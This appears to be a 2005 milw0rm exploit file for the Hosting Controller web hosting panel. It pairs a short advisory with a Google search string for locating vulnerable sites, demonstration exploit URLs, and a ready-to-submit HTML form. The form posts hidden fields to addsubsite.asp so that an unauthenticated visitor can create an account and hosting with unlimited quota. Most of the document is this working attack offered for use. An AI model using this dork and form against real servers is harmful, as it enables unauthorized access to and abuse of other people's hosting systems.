@@ -1,0 +1,47 @@
+<!--
+Tested 
+
+google = intext:"powered by Hosting Controller" intitle:"Hosting Controller"
+
+/str0ke
+
+Advisory Information
+-------------------------
+Software Package   : Hosting Controller
+Vendor Homepage  : http://www.hostingcontroller.com
+Platforms               : Windows based servers
+Vulnerability           : unauthenticated user registeration
+Risk                       : High!
+Vulnerable Versions: All version ( Tested on: v.6.1 Hotfix 1.9 )
+Vendor Contacted   : 5/3/2005
+Release Date          : 5/5/2005
+
+Summary
+------------
+Hosting Controller is a complete array of Web hosting automation tools for
+the Windows Server family platform.
+This vulnerability is on the admin/hosting/addsubsite.asp
+Attacker can create user and host on the target system.
+
+Exploit
+---------
+A demonstration exploit URL is provided:
+
+http://[target]/admin/hosting/addsubsite.asp?loginname=Mouse&password=123456
+http://[target]:8077/hosting/addsubsite.asp?loginname=Mouse&password=123456
+-->
+
+<FORM action="http://[target]/admin/hosting/addsubsite.asp" method="post">
+<INPUT type="hidden" name="reseller" value="resadmin" id="reseller" >
+<INPUT type="hidden" name="domaintypecheck" value="SECOND" id="Hidden1">
+Domain:     <INPUT name="DomainName" value="shabgard.org" id="Hidden2"><BR>
+Username: <INPUT name="loginname" value="Mouse" id="Hidden3"><BR>
+<INPUT type="hidden" name="Quota" value="-1" id="Hidden4">
+<INPUT type="hidden" name="htype" value="27" id="htype" >
+<INPUT type="hidden" name="choice" value="1" id="Hidden7" >
+<INPUT type="hidden" name="mailaccess" value="TRUE" id="Hidden5">
+Mailserver: <INPUT name="MailServerType" value="IMail" id="Hidden6"><BR>
+Password:  <INPUT name="password" value="123456" id="Hidden8"><BR><BR>
+<input type="submit" value="Make"><BR>
+
+# milw0rm.com [2005-05-04]
